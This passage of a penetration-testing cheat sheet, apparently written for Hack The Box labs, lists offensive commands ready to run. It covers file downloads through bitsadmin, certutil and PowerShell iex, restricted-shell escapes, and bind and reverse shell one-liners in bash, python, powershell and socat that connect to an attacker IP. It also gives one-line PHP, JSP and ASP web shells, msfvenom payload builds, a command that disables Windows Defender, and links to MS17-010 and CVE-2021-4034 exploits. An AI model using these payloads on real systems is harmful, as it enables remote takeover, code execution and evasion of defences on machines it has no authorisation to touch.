- Bash (/dev/tcp) (Kali -> Linux)

```
$ exec 3<>/dev/tcp/10.10.10.32/80
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
$ cat <&3
```

- Bitsadmin (Kali -> Windows)

```
C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
PS C:\> bitsadmin /transfer wcb /priority foreground http://<IP address>:8000/nc.exe C:\Users\Administrator\Desktop\nc.exe
PS C:\> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP address>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

PS C:\> Import-Module bitstransfer;
PS C:\> Start-BitsTransfer 'http://<IP address>/nc.exe' $env:temp\t;
PS C:\> $r=gc $env:temp\t;
PS C:\> rm $env:temp\t; 
PS C:\> iex $r
```

- CertReq (https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) (Windows -> Kali)

```
C:\> certreq.exe -Post -config http://<IP address>:8000/ c:\Temp\exploit.exe
$ sudo nc -lvnp 8000
```

- Certutil (Kali -> Windows)

```
C:\> certutil.exe -urlcache -split -f http://<IP address>/exploit.exe 
C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
```

- GfxDownloadWrapper.exe (Kali -> Windows)

```
PS C:\> GfxDownloadWrapper.exe "http://<IP address>/nc.exe" "C:\Temp\nc.exe"
```

- JavaScript (cscript.exe) Downloads (Kali -> Windows)

```
# Save to wget.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

C:\> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

- VBScript (cscript.exe) Downloads (Kali -> Windows)

```
# Save to wget.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

C:\> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

- Rdesktop (Windows -> Windows)

```
$ rdesktop <IP address> -d <domain> -u <username> -p '<password>' -r disk:linux='/home/user/rdesktop/files'
Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
```

- Xfreerdp (Windows -> Windows)

```
$ xfreerdp /v:<IP address> /d:<domain> /u:<username> /p:'<password>' /drive:linux,/home/plaintext/htb/academy/filetransfer
Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
```

- HTTP User-Agents

```
https://useragentstring.com/index.php
https://useragentstring.com/pages/useragentstring.php

PS C:\>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
PS C:\> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\> Invoke-WebRequest http://<IP address>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

#8. - Restricted Shell Escapes
-----------------------------------------

- Shell Escapes

```
$ /bin/sh -i
$ bash -i
$ echo os.system('/bin/bash')
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ script /dev/null -c bash
$ perl —e 'exec "/bin/sh";'
$ perl: exec "/bin/sh";
$ ruby: exec "/bin/sh"
$ lua: os.execute('/bin/sh')
$ awk 'BEGIN {system("/bin/sh")}'
$ find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
$ find . -exec /bin/sh \; -quit
$ vim -c ':!/bin/sh'
```

- Tab Auto Completion

```
$ CTRL+Z
$ stty raw -echo
$ fg
$ reset
$ export TERM=xterm-256color
$ stty rows 67 columns 318
```

#9. - Shells
-----------------------------------------

- Bind Shells

```
$ nc -nlvp <port> -e /bin/bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
$ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("<IP address>",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
$ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

- Reverse Shells

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
$ nc -nv <IP address> <port> -e /bin/bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
$ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
$ socat file:`tty`,raw,echo=0 tcp-listen:4444
$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
msf> use exploit/multi/handler
```

- Web Shells

```
https://github.com/jbarcia/Web-Shells/tree/master/laudanum
https://github.com/samratashok/nishang/tree/master/Antak-WebShell
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
PHP: <?php system($_REQUEST["cmd"]); ?>
JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
ASP: <% eval request("cmd") %>
```

- Default Webroot Locations

```
Apache: /var/www/html/
Nginx: /usr/local/nginx/html/
IIS: c:\inetpub\wwwroot\
XAMPP: C:\xampp\htdocs\
```

- MSFvenom

```
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Edit IP address and port

$ msfvenom -l payloads
$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP address> LPORT=<Port> -f raw > shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f asp > shell.asp
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<Port> -f aspx > shell.aspx
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
$ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f elf > shell.elf
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho > shell.macho	
```

#10. - Evasion
-----------------------------------------

- Disable Windows Defender

```
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true	
```

#11. - Online Resources
-----------------------------------------

- Speedguide

```
https://www.speedguide.net/port.php?port=3389
```

- CrackStation

```
https://crackstation.net/
```

- Living Off The Land Binaries, Scripts and Libraries (LOLBAS)

```
https://lolbas-project.github.io/
```

- GTFOBins

```
https://gtfobins.github.io/
```

#12. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```

- FoxyProxy: proxy management

```
https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
```

#13. - Exploits
-----------------------------------------

- MS17-010

```
https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
$ ./zzz_exploit.py <IP address> ntsvcs
https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
https://github.com/3ndG4me/AutoBlue-MS17-010
```

- MS08-067

```
https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
```

- CVE-2007-2447

```
https://github.com/amriunix/CVE-2007-2447
```

- PHP 8.1.0-dev Backdoor Remote Code Execution

```
https://github.com/flast101/php-8.1.0-dev-backdoor-rce
```

- CVE-2021-4034

```
https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
```

#14. - Exploit Research
-----------------------------------------

- CVEdetails

```
https://www.cvedetails.com/
```

- Exploit DB

```
https://www.exploit-db.com/
```

- Vulners

```
https://vulners.com/
```

- Rapid7

```
https://www.rapid7.com/db/
```

- Vulnerability Lab

```
https://www.vulnerability-lab.com/
```

- Packet Storm Security

```
https://packetstormsecurity.com/
```

- NIST

```
https://nvd.nist.gov/vuln/search?execution=e2s1
```
